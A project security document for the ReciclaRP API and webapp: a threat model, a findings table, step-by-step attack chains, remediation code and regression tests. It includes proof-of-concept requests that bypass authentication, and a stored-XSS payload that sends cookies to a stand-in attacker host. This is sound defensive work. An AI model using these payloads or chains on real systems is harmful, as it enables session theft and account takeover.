# Security — threat model, attack surface and known weaknesses

This document is the reference for security work on ReciclaRP. It describes
how an attacker would approach a running instance, which defects make those
attacks cheap, and how each one is meant to be fixed. It exists because the
API's authentication model is unusual (no middleware, token in the request
body, in-memory sessions), so generic advice does not apply.

Scope: an instance of `api/src/server.js` plus the webapp pages that render its
data. All findings were verified against a **local, disposable instance**
(temp directory + temp SQLite DB, `RECICLA_RESEND_SECRET` unset). Do not run
the PoCs against a deployment you do not own.

Red suite: `api/tests/security.regression.test.js`. Tests **without** `skip`
are active guards. Tests **with** `skip` describe the safe behaviour, fail on
the current code, and name the finding below; removing the `skip` is the
acceptance criterion for the corresponding fix.

Update 2026-11-14: the maintainer applied the minimal coercion fix — every
session/OTC comparison went from `==` to `===` (`server.js:651, 680, 712, 748,
776, 817, 878, 948, 985, 1022, 1059, 1105, 1151`), followed by the
escalation-code check at line 777. SEC-001, SEC-002 and SEC-003 are closed and
their tests are active. The sections below keep the original analysis and
record, per finding, what the shorthand does **not** fix.

## 1. Assets and actors

| Asset | Why it matters |
| --- | --- |
| ONG account (`user.ong = 1`) | Can approve, edit and delete any point; reads per-point access logs. It is the moderation trust anchor. |
| Session token (`token_list`) | Bearer credential for every authenticated route. Lives in memory only, never expires except on restart. |
| One-time code (OTC) | 6-digit code in `Tickets`; the only proof that the caller controls the e-mail address. |
| Point/report/access data | Map integrity; the app's only real product. |
| User e-mails | Personal data (LGPD), plus they are the account identifier. |
| Availability | Login and point writes are limited to 1 request / 2 min per IP. |

Actors: anonymous visitor (can reach `/point/list` and `/api/ping`), registered
citizen (can create points/reports), ONG moderator, operator (owns env vars and
logs), and an attacker who may be any of the first two.

## 2. Trust boundaries

```
visitor ──HTTP──▶ API (no auth middleware; each route re-checks email+token)
                   │  body is JSON; identity is *claimed* by req.body.email
                   ├──▶ SQLite (better-sqlite3, synchronous, FKs off by default)
                   ├──▶ Resend (or stdout in guest mode)
                   └──▶ operator logs (pino, INFO by default)
webapp (Vite, vanilla JS) ── innerHTML rendering of API strings
cookies logintok/loginmail ── readable and writable by any script on the origin
```

Two consequences dominate the threat model:

1. **Identity comes from the body, and the comparison is type-coerced.** Any
   mismatch between the sentinel returned for "no session" (`false`) and the
   attacker's string turns into authentication.
2. **The webapp renders text with `innerHTML` and keeps the bearer token in a
   JS-readable cookie.** One stored-XSS becomes a moderator session theft.

## 3. Findings

Severity uses impact × reachability on a default deployment.

| ID | Severity | Status | Finding | Where |
| --- | --- | --- | --- | --- |
| SEC-001 | Critical | **Fixed** 2026-11-14 (`===`) | `/auth/token` minted a token for any existing account using `code: "0"`, with no login request and no e-mail access | `server.js:651` |
| SEC-002 | Critical | **Fixed** 2026-11-14 (`===`) | Every route compared `token_list.get(email) == token` (or `account.token_read() == token`); when no session existed `get()` returned `false`, and `false == "0"` was `true` — anonymous write access | `server.js:680, 712, 748, 776, 817, 878, 948, 985, 1022, 1059, 1105, 1151` |
| SEC-013 | High | Open | Stored XSS: `time_open`/`time_close` are never validated or sanitized, and the webapp injects them with `innerHTML` on the map, ONG panel and report page | `server.js:845-846`, `webapp/src/map.html.js:38`, `webapp/src/ong-menu.html.js:110`, `webapp/src/user-report.html.js:28` |
| SEC-003 | Low | **Fixed** 2026-11-14 (`===`) | `/auth/special` compared the escalation code with `==` (line 777), so an array/number coerced to the secret; a missing `code` was already rejected | `server.js:777` |
| SEC-004 | Medium | Open | `/point/list` returns the whole table, including `approved = 0` (the moderation queue) and every `creator` id, to anonymous callers | `server.js:579-585, 808` |
| SEC-005 | Medium | Open | A request without a JSON body leaves `req.body` undefined; the handler throws and Express returns a 500 HTML page with a full stack trace and source path | `server.js:606, 612` |
| SEC-006 | Medium | Open | Rate limits key on the socket IP. Behind nginx/Cloudflare without `trust proxy`, every user shares one bucket: 100 requests take the whole deployment offline for 15 min, and one request occupies the single login slot for 2 min | `server.js:54-90` |
| SEC-007 | Medium | Open | No validation of `lati`/`long` (any JSON type reaches SQLite and Leaflet) or of the time fields (free text) | `server.js:837-853` |
| SEC-008 | Medium | Open | If `RECICLA_ESCALATION_TOKEN` is unset, a token is generated **and logged at INFO** on every boot (`"Autogenerated: …"`); logs become a moderator credential | `server.js:32-47` |
| SEC-009 | Medium | Open | A banned account can still exchange a previously issued code for a token; `/auth/token` never checks `banned` | `server.js:647-672` |
| SEC-010 | Medium | Open | `/auth/delete` does not invalidate the token, does not clear `ong`, and renames the row to a fixed e-mail — a self-deleted ONG leaves a login-able placeholder. The next request also silently recreates the account because `Account` auto-inserts | `server.js:333-345` |
| SEC-011 | Low | Open | `/report/create` accepts non-existent `pid`s (foreign keys are off), and report/access writes have no limiter, so an attacker can grow the DB without bound | `server.js:587-604, 1019, 1102` |
| SEC-012 | Low | Open | Unknown routes return Express' HTML 404 instead of the documented `{type, description}` envelope | `server.js` (no 404 handler) |
| SEC-014 | Medium | Open | No security headers on the webapp host (`CSP`, `X-Frame-Options`/`frame-ancestors`); the ONG panel performs approve/delete from a single click on a query-param link, so it is trivially clickjackable. Session cookies have no `Secure`/`SameSite` and must stay JS-readable | `webapp/ong-menu.html.js:9-34`, `webapp/src/logic/login.js:102-103` |
| SEC-015 | Low | Open | `MAX_POINTDESCRIPTION_LEN` is applied *before* `xss.filterXSS`, which expands `<`/`>` into entities; a 200-char payload can be stored longer than the cap | `server.js:838-842` |

### SEC-001 — OTC bypass (critical)

`Tickets.get()` deletes the pending code and returns `false` when there is
none. The comparison is loose:

```js
if(ticket_queue.get(req.body.email) == req.body.code) {
```

`false == "0"` evaluates to `true`, because both sides coerce to `0`. The
string `"0"` is truthy, so it passes the `req.body.code` presence check.

Verified on a fresh instance:

```
POST /auth/token {"email":"admin@example.com","code":"0"}
→ {"type":"okay","token":"2843647930331493429123354472272808300144"}
```

No `/auth/login`, no e-mail, no code. The returned token then satisfies any
route guarded by `token_read()` — including ONG-only routes, because the
seeded moderator account is `admin@example.com` (`RECICLA_ADMIN_EMAIL`
defaults to `test@example.com`).

An empty array (`[]`), `false`, and `0` are equivalent payloads (`[] == false`
is also `true`). Prototype keys are a second, independent sentinel bug:
`token_list.get("__proto__")` returns `Object.prototype`, which coerces to
`"[object Object]"`.

**Status (2026-11-14): fixed by `===`.** `false === "0"` is false, so no
ticket means no token, and arrays/objects no longer coerce. Two tests cover it
(`refuses the string "0"`, `refuses an empty array`). Residual: the comparison
is not constant-time, `Tickets.get()` still uses `false` as "absent" and a
plain object for storage, and any wrong guess still burns the victim's pending
code (SEC-001b, still skipped). Prefer `safe_equal` (§5.1) on the next pass.

### SEC-002 — authentication bypass on every route (critical)

The same sentinel appears in front of every authenticated route:

```js
if(token_list.get(req.body.email) == req.body.token) {
```

For an e-mail with no session, `get()` returns `false`, so `token: "0"`
authenticates. Verified:

```
POST /point/create {"email":"no-session@example.com","token":"0","data":{…}}
→ {"type":"okay"}          # row written with approved = 0, creator = 1
```

Because `new Account(email)` auto-creates any syntactically valid address, the
row is attributed to a brand-new account. ONG-only routes still call
`is_ong()` afterwards, so they are not directly reachable this way — SEC-001
turned that last gate into a formality until it too was fixed.

**Status (2026-11-14): fixed by `===` on all 12 token checks** (`token_list.get`
and `account.token_read()`, including `/auth/delete`, `/auth/logout`,
`/auth/special` and the newer `/point/access/no`). Four tests are active:
`/point/create`, `/point/access/log`, `/auth/check` and `/auth/delete` with
`token: "0"`. Residual: `get()` still returns `false`, the comparison is not
constant-time, and `===` only protects call sites — a future
`if(token_list.get(email))` or `==` reintroduces the bug. `Map` + `safe_equal`
is the durable form.

### SEC-013 — stored XSS to moderator takeover (high)

`pointdescription` is passed through `xss.filterXSS`, but the time fields are
not:

```js
time_open: req.body.data.time_open,     // any JSON string
time_close: req.body.data.time_close,
```

The webapp interpolates them into templates assigned to `innerHTML`:

- `map.html.js` — popup, shown to every visitor who opens a point;
- `ong-menu.html.js` — the moderation table, shown to the ONG;
- `user-report.html.js` — the report page.

Payload:

```html
<img src=x onerror="fetch('https://attacker.example/c?t='+encodeURIComponent(document.cookie))">
```

`logintok` and `loginmail` are plain cookies with no `HttpOnly`/`SameSite`/
`Secure` (`login.js:102`), so the script reads them directly. Get the ONG to
open the panel and the moderator session is exfiltrated with no click. Even
without the ONG, the payload runs on the public map for every visitor.

### SEC-003 / SEC-008 — self-service ONG promotion

`/auth/special` needs a valid session plus the escalation code. It checks
`req.body.code == ESCALATION_TOKEN` without requiring `code` to exist. With
`code` omitted the comparison is `undefined == "<numeric string>"` → false, so
absence alone is not exploitable today — but any value that coerces to the
token is accepted (`[token]`, `token` as a number when it is small). More
importantly, the token is printed to the logs at boot whenever the operator
did not set it, which is the default in this repo (`.env` has no such key).
Anyone who can read logs (support bundle, log aggregator, CI artifact) becomes
an ONG.

**Status (2026-11-14): fixed by `===`.** Both checks are exact now, so
arrays/objects no longer coerce and a missing `code` is rejected;
`SEC-003b` is active alongside the missing-code guard. Coercion was never the
large risk here — SEC-008 is: without the env var, the token is printed at
INFO on boot, and anyone who can read the logs promotes an account for free.

### SEC-006 — availability

`req.ip` is the socket address; no `trust proxy` is configured. Local check:

```
GET /api/ping  X-Forwarded-For: 203.0.113.9  →  ::ffff:127.0.0.1
```

Behind a reverse proxy that means one shared bucket for the whole deployment.
Concretely: 100 requests from one client produce `429` for *everyone* on
`/point/list`, `/auth/check`, etc. for 15 minutes; one `/auth/login` occupies
the only login slot for two minutes. The per-IP design also means the 1/2min
limits cost an attacker one address per attempt, not a real barrier.

### SEC-004 — moderation queue exposure

`/point/list` is unauthenticated and unfiltered by `approved`. Verified after
an anonymous create:

```
[ { pid: 9, pointdescription: 'UNAPPROVED SCRAPED POINT', approved: 0, creator: 1, … } ]
```

Pending points can be scraped before moderation (spam, vandalism, personal
data in descriptions), and the public map renders them as if they were
approved (`pullMapData()` is the only data source). `creator` ids are also
exposed, which maps contributions to accounts.

### SEC-005 / SEC-012 — error surface

```
POST /auth/login            (no body/content-type)
→ 500  text/html
→ TypeError: Cannot read properties of undefined (reading 'email')
     at /home/…/api/src/server.js:612:15
```

The stack trace leaks absolute paths and internal call structure, and the
non-envelope response breaks clients. `NODE_ENV` is not set by any documented
run command, so Express stays in development mode.

### SEC-010 — deletion is not deletion

`__delete()` updates `uname`/`email`/`banned`/`validated` but not `ong`, does
not touch `token_list`, and writes a constant e-mail. Consequences: the token
keeps working; `/auth/check` on the original address recreates the account
(`Account` auto-inserts) so the data subject's identity is silently restored;
deleting a second account throws on the UNIQUE constraint and returns 500.

Worse, this is a self-contained escalation path, verified locally:

```
POST /auth/delete {"email":"admin@example.com","token":"0"}   → {"type":"okay"}
rows: [{ id: 0, uname: 'Deleted User',
         email: 'deleted-email-recicla@comrades.sbs', ong: 1, validated: 1 }]
POST /auth/token  {"email":"deleted-email-recicla@comrades.sbs","code":"0"}
→ token + /auth/check → {"ong":true}
```

The constant replacement address is a valid e-mail, is public in the source,
and keeps the moderation flag: anyone who deletes an ONG (or the ONG deletes
itself) leaves a login-able moderator account behind. That is why the `===`
sweep must include the four `token_read()` sites, and why `__delete()` must
clear `ong` and use a unique, non-deliverable address.

**Status (2026-11-14): the anonymous variant is closed.** `/auth/delete` now
uses `===`, so `token: "0"` can no longer delete an arbitrary account (test
active). A **self-deletion** by a real ONG still goes through the old
`__delete()` and still leaves the `deleted-email-recicla@comrades.sbs`
placeholder with `ong = 1`, `validated = 1`; the two remaining SEC-010 tests
(no token invalidation, no public ONG placeholder) stay red.

## 4. Attack chains

### Chain A — unauthenticated moderator takeover (no victim interaction)

1. `POST /auth/token {"email":"admin@example.com","code":"0"}` → token (SEC-001).
2. Replay it on the ONG routes: `/point/update`, `/point/remove`,
   `/point/approve`, `/point/access/get`.
3. Optional: `/auth/special` with the escalation code read from the startup log
   (SEC-008) promotes a sock-puppet account when the admin e-mail is unknown.

Impact: full control of the map (approve spam, delete real ecopontos, rewrite
descriptions) and of the moderation telemetry. No trace beyond ordinary log
lines; the token is valid until the API restarts.

### Chain B — anonymous stored XSS, persistent moderator session theft

1. `POST /point/create` with `token: "0"` (SEC-002) and an XSS payload in
   `time_open` (SEC-007/SEC-013), e.g. the `img onerror` above.
2. The row is public immediately (SEC-004): the map popup executes the payload
   for every visitor; the ONG panel executes it for the moderator, because
   pending rows are rendered there too.
3. The payload reads `document.cookie` (SEC-014) and posts it to the attacker.
4. The attacker replays the stolen token against ONG routes.

Impact: persistent, self-propagating takeover that survives restarts of the
victim's browser and needs no phishing. This chain is the reason SEC-002 and
SEC-013 are rated by their combination, not individually.

### Chain C — one-address outage

Behind a proxy: 100 requests to any route (`/api/ping` is enough) exhaust the
general limiter for all users (SEC-006). Without a proxy: 100 addresses do the
same. Concurrently, `/point/access/log` and `/report/create` accept unbounded
writes (SEC-011), so the same traffic can fill the disk / bloat the SQLite file.

### Chain D — clickjacking a moderator

Frame `ong-menu.html` (no `frame-ancestors`, no `X-Frame-Options`, SEC-014).
Approve/delete are single links that act on page load
(`?approvepid=…`, `?deletepid=…`), so one click on a disguised button approves
the attacker's point or deletes a competitor's.

## 5. Remediation specification (proposals — a human applies them)

These are ready-to-apply sketches, not applied changes. Line numbers refer to
`api/src/server.js` at the time of writing.

### 5.1 Comparisons and sentinels (SEC-001, SEC-002, SEC-003, SEC-009)

**Applied 2026-11-14:** the shorthand `==` → `===` on all 12 token checks, on
the OTC check and on the escalation-code check. That closes the coercion
class, but keeps the `false` sentinel and a non-constant-time comparison, so
the durable version below is still the next pass — not an alternative for a
rewrite.

Add after `bton()`:

```js
function safe_equal(a, b) {
  if (typeof a !== 'string' || typeof b !== 'string') return false;
  const ab = Buffer.from(a, 'utf8');
  const bb = Buffer.from(b, 'utf8');
  return ab.length === bb.length && crypto.timingSafeEqual(ab, bb);
}

// Loads an existing account without ever creating one.
function load_account(email) {
  if (typeof email !== 'string') return null;
  const account = new Account(email, { create: false });
  return account.exists() ? account : null;
}

function authenticate(req) {
  const { email, token } = req.body || {};
  const account = load_account(email);
  if (!account || account.__is_banned()) return null;
  if (!safe_equal(account.token_read(), token)) return null;
  return account;
}
```

`Account` gains an opt-out from auto-creation (`constructor(email, { create = true } = {})`,
`else if (create && this.__email_valid()) this.__create();`), and the `Tickets`/
`Tokens` maps become `Map`s (removes `__proto__`/`constructor` sentinels):

```js
class Tokens {
  constructor() { this.tokens = new Map(); }
  new(email) { const token = this.__newtoken(); this.tokens.set(email, token); return token; }
  get(email) { return this.tokens.get(email); }          // undefined, never false
  invalidate(email) { this.tokens.delete(email); }
}
```

`/auth/token` becomes: require `typeof code === 'string'`, `load_account`,
reject banned, consume the ticket with `safe_equal`, and only then issue the
token. `/auth/special` requires `typeof req.body.code === 'string'` and
`safe_equal`. Every authenticated route replaces its hand-rolled check with
`const account = authenticate(req); if (!account) return res.json({type:'error', …})`.
The sweep includes `/point/access/no` (added in `4e596cc`), which repeats the
same `token_list.get(...)` pattern and is ONG-gated; it now uses `===` too, so
keep it in the list whenever the check is refactored into `authenticate()`.

### 5.2 Ticket lifecycle (SEC-001b, SEC-009)

Keep the code alive after a wrong guess, count attempts, burn after three
(today one wrong guess destroys the legitimate user's code):

```js
check(email, candidate) {
  this.purge();
  const ticket = this.tickets.get(email);
  if (!ticket || typeof candidate !== 'string') return false;
  ticket.attempts += 1;
  if (ticket.attempts > 3) { this.tickets.delete(email); return false; }
  if (!safe_equal(ticket.code, candidate)) return false;
  this.tickets.delete(email);
  return true;
}
```

### 5.3 Request parsing, 404 and errors (SEC-005, SEC-012)

```js
app.use(express.json({ limit: '32kb' }));
app.use((req, res, next) => { if (req.body === undefined) req.body = {}; next(); });
// … routes …
app.use((req, res) => res.status(404).json({ type: 'error', description: 'Not found.' }));
app.use((err, req, res, next) => {
  logger.warn({ path: req.path, reason: err.message }, 'malformed request');
  res.status(err.status || 400).json({ type: 'error', description: 'Malformed request.' });
});
```

Run the API with `NODE_ENV=production` (document it in `README.md`/`api.md`)
so Express never renders stack traces.

### 5.4 Input validation (SEC-007, SEC-015)

```js
const TIME_RE = /^([01]?\d|2[0-3]):[0-5]\d$/;
const to_bool = (v) => (v === true || v === 1 || v === '1') ? 1
                  : (v === false || v === 0 || v === '0' || v === '') ? 0 : null;
```

Validate: `Number.isFinite(lati) && -90 <= lati <= 90`,
`Number.isFinite(long) && -180 <= long <= 180`, both times matching `TIME_RE`,
each `accepts_*` accepted by `to_bool` (preserves the normalisation behaviour
asserted in `points.test.js`). Sanitize first, then cap:
`xss.filterXSS(String(desc)).substring(0, MAX_POINTDESCRIPTION_LEN)`.

The durable fix for SEC-013 is on the webapp side: render untrusted strings
with `textContent`/DOM nodes instead of `innerHTML`
(`map.html.js:38,47`, `ong-menu.html.js:105`, `user-report.html.js:26-31`).
Sanitizing the time fields is a stopgap, not a substitute.

### 5.5 Rate limiting and deployment (SEC-006)

```js
app.set('trust proxy', Number(process.env.RECICLA_TRUST_PROXY || 0));
```

Document that `RECICLA_TRUST_PROXY` must equal the number of trusted proxy
hops (never `true`) and that omitting it on a proxied deployment creates the
global-bucket DoS. Consider keying auth limiters by `ip + email` and adding a
per-account limiter for `/report/create` and `/point/access/log`.

### 5.6 Escalation token (SEC-003, SEC-008)

As of 2026-11-14 the check is `===`, which removes coercion; the constant-time
comparison and the disabled-when-unset behaviour below are still pending.

Do not generate-and-log. If `RECICLA_ESCALATION_TOKEN` is absent, leave
`ESCALATION_TOKEN = null` and make `/auth/special` answer
`{type:'error', description:'Unavailable.'}`; log only that the route is
disabled. When present, require at least 32 random bytes and compare with
`safe_equal`.

### 5.7 Moderation queue (SEC-004)

`/point/list` returns `approved = 1` rows unless the caller authenticates as
ONG (`get_point_list_approved()` vs `get_point_list()`). This requires a
matching webapp change: `pullMapData()` does not send credentials today, so
`ong-menu` needs an authenticated list call (or a new `/point/pending` route).
Also drop `creator` from public responses.

### 5.8 Deletion (SEC-010)

```js
__delete() {
  token_list.invalidate(this.email);
  db.prepare(`UPDATE user SET uname = ?, email = ?, banned = 0,
              validated = 0, ong = 0 WHERE id = ?`)
    .run('Deleted User', `deleted-${this.id}@invalid.reciclarp`, this.id);
}
```

Uniqueness per id fixes the second-delete 500, and `load_account` (§5.1)
stops the silent recreation. Treat deletion as anonymisation: points/reports
keep the numeric `uid`/`creator`.

### 5.9 Foreign keys and write amplification (SEC-011)

`db.pragma('foreign_keys = ON')` at boot, plus an explicit
`SELECT 1 FROM point WHERE pid = ?` before writing a report/access row (a raw
FK violation would surface as a 500 without the §5.3 handler). Add a limiter
for those two routes.

### 5.10 Headers and cookies (SEC-014)

On the webapp host (nginx/Caddy, not Express):

```nginx
add_header X-Frame-Options "DENY" always;
add_header Content-Security-Policy "default-src 'self'; img-src 'self' data: https://*.tile.openstreetmap.org; connect-src 'self' http://localhost:3000; frame-ancestors 'none'" always;
add_header Referrer-Policy "no-referrer" always;
```

`file://`/localhost dev flows still need the map tile origin. Cookies should at
minimum get `Secure; SameSite=Lax`; making them `HttpOnly` requires moving the
token out of `document.cookie` (HttpOnly session cookie + CSRF token), which is
a larger, separate change.

## 6. What to test after a fix

```bash
cd api && node --test tests/security.regression.test.js
```

| Finding | Test |
| --- | --- |
| SEC-001 | `refuses the string "0"` ✅, `refuses an empty array` ✅, `incorrect code is consumed…` ⏳ |
| SEC-002 | `rejects the token "0"` ✅ ×4 (`/point/create`, `/point/access/log`, `/auth/check`, `/auth/delete`) |
| SEC-003 | `refuses a missing code` ✅, `refuses an array-shaped escalation code` ✅, `promotes … exact escalation code` ✅ |
| SEC-004 | `hides unapproved points from anonymous callers` ⏳ |
| SEC-005 | `returns a JSON 400 envelope` ⏳, `non-JSON content type` ⏳ |
| SEC-007 | `rejects non-numeric coordinates` ⏳, `sanitizes the … time fields` ⏳ |
| SEC-009 | `refuses to mint a token for a banned account` ⏳ |
| SEC-010 | `invalidates the token and keeps the account deleted` ⏳, `no public placeholder…` ⏳ |
| SEC-011 | `rejects a pid that does not exist` ⏳ |
| SEC-012 | `unknown route returns the JSON error envelope` ⏳ |
| SEC-015 | `sanitized and capped at 200 characters` ⏳ |

✅ active (must stay green) · ⏳ skipped until fixed. The working set is
13 active / 12 skipped / 0 failing; run the file directly (not `npm test`)
while the rest of the suite is red for unrelated reasons.

Already-green guards beyond SEC-001/002/003: ONG-only point mutations, token
isolation between accounts, one-time code replay.

Note: `npm test` is already red on a clean checkout (9 failures, none from the
security suite). Eight come from `points.test.js`, `rate-limits.test.js` and
`persistence.test.js` sending `accepts_*` at the body root while the server
reads `data.accepts_*`; `auth.test.js` asserts a 5-digit code while
`__newcode()` issues six. Settle that before treating the suite as a security
gate.

## 7. Detection and operations

- Alert on `POST /auth/token` succeeding for an e-mail with no preceding
  `POST /auth/login` in the last `RECICLA_OTC_DURATION` minutes. Since
  SEC-001 is fixed this should be rare; the alert doubles as detection of
  ticket burning (SEC-001b) and of stolen codes.
- Alert on `GET /api/ping` with an `X-Forwarded-For` header: on a correctly
  configured deployment it must be ignored, and the request usually means
  someone is probing the proxy topology.
- Grep for `<`/`onerror` in `time_open`/`time_close` rows; a non-empty result is
  an active SEC-013 attempt.
- Watch `429` spikes and `access`/`report` row growth.
- Rotate `RECICLA_ESCALATION_TOKEN` by restarting the API; restart also
  invalidates all tokens, which is the only current containment for a stolen
  moderator session.
- Guest mode (`RECICLA_RESEND_SECRET` unset) writes OTC codes to stdout: never
  enable it on a shared host, and scrub logs before sharing them.

## 8. Residual risks / accepted for now

- Tokens never expire and are not bound to a device or IP; in-memory storage
  means a restart logs everyone out, which is the only blast-radius control.
- One account can own unlimited points/reports; no reputation or dedup.
- `validated` is written but never read: e-mail ownership is only proven for
  login, not for account creation.
- CORS is restricted to `RECICLA_WEBAPP_URL`, which prevents cross-origin
  reads but not CSRF via simple requests; the JSON body plus preflight keeps
  CSRF low while the token stays out of cookies for the API.
